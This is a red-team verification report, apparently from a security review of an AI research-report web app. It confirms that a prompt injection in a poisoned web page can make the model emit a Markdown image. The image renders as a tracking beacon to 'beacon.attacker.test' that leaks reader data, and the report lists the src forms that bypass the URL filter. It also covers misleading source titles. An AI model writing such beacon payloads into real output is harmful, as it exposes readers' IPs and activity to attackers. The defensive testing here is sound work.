# C1C2 — verdict: M-C1 CONFIRMED (one sub-claim downgraded) · M-C2 DOWNGRADED

## M-C1 · Markdown image = beacon — CONFIRMED
- Why: I rendered the two PRODUCTION pages, not a bare viewer. `JobView` (`apps/fbizlab/src/pages/JobView.tsx:116`, real `ReportViewer`, hooks mocked at the same seam `job-view.test.tsx` uses) with a completed Florida-shaped report → **2 `<img src="https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID">`** (market prose + `deep_dives[].overview` inside `.rv-deal`); `ReadReport` (`ReadReport.tsx:76`, the share link AND the admin's only report view — `apps/admin/src/pages/JobDetail.tsx:65-72` opens `/report/:id?rt=`) → the same 2. Evidence: `apps/fbizlab/test/red-team-refute-C1C2.test.tsx` (`it.fails` ×2, red today; console shows count 2/2). Nothing neutralises it: `MD` (`ReportViewer.tsx:115`) overrides only `a` and is shared by all five `<Markdown>` sites (Prose, DealCard risks, Checklist, string arrays); react-markdown is a single hoisted **9.1.0** whose `defaultUrlTransform` (`node_modules/react-markdown/lib/index.js`, `safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i`) allows `https:` for `src` — and ALSO anything with no colon, so `![a](//beacon.attacker.test/p.gif)` and `![b](/api/leak.gif)` render too (CONTROL test, srcs observed verbatim); `apps/fbizlab/firebase.json` and `index.html` carry no CSP/`img-src`/referrer meta (grep empty). **Corrections to the finder:** (1) `apps/admin/src/components/ReportViewer.tsx` is imported by NOTHING in the admin app (grep + git: last touched at 001e5f9) — it does render the `<img>` (`apps/admin/test/red-team-refute-C1C2.test.tsx`, red today) but it is dead code; the admin's real exposure is ReadReport. (2) "URL can carry the brief" is REASONED, not reproduced: the harness fixture's URL is attacker-fixed (`poisoned-web.ts:186`); the brief IS in the writer prompt (`prompt.ts:401 briefBlock` ← `florida-business-for-sale.ts:1321-1339`: location, industry, keywords, price band, min revenue/SDE, SBA, RE, preferred sources) but leaking it needs the model to also obey an interpolation instruction — unmeasured. What is PROVEN to leak per open: reader IP, UA, time, product origin (Referer default `strict-origin-when-cross-origin`), and "my page made it into a report" via a per-page-unique URL — no model cooperation needed beyond writing the image once. Also: an image whose beacon 404s shows the alt text ("Bubbles Express verified photo") as a visible artifact in the buyer's dossier.
- Severity: **P1** (buyer/reader data — IP + open events to a page author, on every open of the report and of the forwarded copy; no money, no report corruption; requires an obeyed injection whose live rate is unmeasured). Damage statement: *An obeyed `![…](url)` in any prose field becomes a live `<img>` in the buyer's JobView and in the shared/admin ReadReport, so the page author receives one GET (reader IP, UA, time, product origin, plus whatever the URL carries — attacker-fixed today; the buyer's brief only if the model is also steered to interpolate it) on every open; the PDF draws none.*
- Fix: **agree** — `img: () => null` in the shared `MD` constant (`ReportViewer.tsx:115`) covers all five `<Markdown>` sites in one line and kills every src form (https, protocol-relative, same-origin, reference-style) because it is element-level, not URL-level. Delete the dead admin viewer or give it the same line. Honest cost: none — Florida `charts` is `z.array(chartSchema)` → recharts SVG (`ReportViewer.tsx` has no `<img>` at all; grep), `MARKDOWN_DIRECTIVE` (`prompt.ts:50-54`) invites links only, and `grep '!\['` over honest fixtures/mocks/templates is empty. Alternative if alt text is wanted: `img: ({alt}) => alt ? <span>{alt}</span> : null` — parity with the PDF, which prints `!<a>alt</a>`.
- Test quality: `red-team-c-attack.test.tsx :: DEFECT · overview / risks / nextStep` and `DEFECT · a DealCard prose field` — assert CONTENT (`img[src]` list must be `[]`), fail today for the stated reason (3 and 1 srcs === BEACON; render asserted first). Mutation reds after fix: remove `img` from `MD`. `red-team-c-legit.test.tsx:87` (plain `it`, pins "img renders today") **will go red when the fix lands** — intentional per its comment; whoever fixes flips it and flips the two `it.fails` to `it`. My tests: fbizlab `red-team-refute-C1C2.test.tsx` (JobView/ReadReport `it.fails` — red today; CONTROL relative forms — passes), admin `red-team-refute-C1C2.test.tsx` (`it.fails` — red today).
- Worse (verified): protocol-relative and same-origin image srcs pass `defaultUrlTransform` too, so a `urlTransform`-based fix would be wrong; the element-level `img: () => null` is the right layer.

## M-C2 · Sources naming / shape — DOWNGRADED
- Why: **F2 (title = name, no host, unclipped) is real but hygiene.** Verified: the source's label is `s.title || s.url` (`florida-business-for-sale.ts:769-773`; title from Brave/Tavily via `gather.ts:291`, `dedupeSources` `src/tools/sources.ts:28-39` only dedupes); the fbizlab row text is `"↗Florida Department of Business Regulation — … (PZ-SRC)"` with `href=https://attacker.test/…` and no `attacker.test` in visible text (my JobView `it.fails`, red today); the PDF row's visible text is identical (`packages/core/test/red-team/refute-C1C2.test.ts`, `report-html.ts:252`); a 5,000-char label is one 5,000-char `<li>` (MEASURE, passes). But it is exactly what a search engine's result list shows too, the href is honest, and both renderers print it as TEXT (Florida shape pinned SOUND in both finder files) — a deception in the provider's data, not our injection. **F4 (`[{title,url}]` renders title as Markdown) is a FIXTURE ARTIFACT:** the registry holds one template (`registry.ts:9`), and its `sources.derive` returns `{items:[{id,url,label}]}` (measured over `listTemplates()` — table: florida → `items`); the only `[{title,url}]` derives are `test/fixtures/red-team-model.ts:63` and `compact-model.ts:59`; `docs/research-models.md:49-51` prescribes `{ id, url, label }`. The underlying property (a derived section's strings are Markdown unless a recogniser matches) is a forward-compat note for the next template, not a buyer-facing defect today. One thing the finder missed, verified: the (dead) admin viewer has NO `SourceList` branch, so even the FLORIDA `{items}` label goes through `<Markdown>` there → phish anchor + `<img>` (admin refute test, red today) — moot while unused, but a reason to delete the file rather than "fix both viewers".
- Severity: **P2 hygiene**. Damage statement: *The Sources row in the web viewer and PDF shows the page's own `<title>` as the source's name with no visible hostname and no length bound, so a page can name itself as an authority (href stays honest); the `[{title,url}]` Markdown-rendering path exists only in test fixtures — no production template derives it.*
- Fix: **narrower** — clip and hostname at the RENDER property only (`SourceList` `ReportViewer.tsx:228-232` and `sourceListHtml` `report-html.ts:251-253`): `hostname — label`, hostname via `new URL(url).hostname` minus `www.` (try/catch → omit), label clipped to ~160 code points with `…` and the full title kept in `title=` (viewer). Do NOT clip in `derive`/`dedupeSources`: report.json/sources.json stay faithful and `c-legit.test.ts:141-152` (130-char title whole, derive-level) stays green. F4: skip "recognise `{title,url}` arrays" — instead a one-line note in `docs/research-models.md` that a derived `sources` must use the `{items}` shape (or a `templates:check` rule), since no production shape needs it.
- Test quality: `c-attack.test.ts :: MEASURE · every payload lands verbatim` asserts CONTENT (title string in `out.sources` and `report.sources`) — passes, correctly labelled MEASURE; the "label" claim for Florida is by code reading of `derive` (accurate). Both `SOUND (Florida shape)` tests assert content and their mutations (`mdInline(s.label)` / wrap in `<Markdown>`) would red them (reasoned). `DEFECT (generic shape)` (both files) — asserts content (`href="https://phish…"` absent / `img` null), fails today for the stated reason, but on a fixture-only shape. `c-legit.test.ts:141` guards the derive-level title; a render-level clip does not touch it (verified by reading — it calls `dedupeSources` directly).
- Nothing verified that makes C2 worse for a buyer today.

## Files
- `/Users/javier/Documents/src.nosync/personal/agent-researcher/apps/fbizlab/test/red-team-refute-C1C2.test.tsx` (5 tests, green; 3 `it.fails` red today)
- `/Users/javier/Documents/src.nosync/personal/agent-researcher/apps/admin/test/red-team-refute-C1C2.test.tsx` (2 `it.fails`, red today; the component is unused)
- `/Users/javier/Documents/src.nosync/personal/agent-researcher/packages/core/test/red-team/refute-C1C2.test.ts` (2 MEASURE, pass)
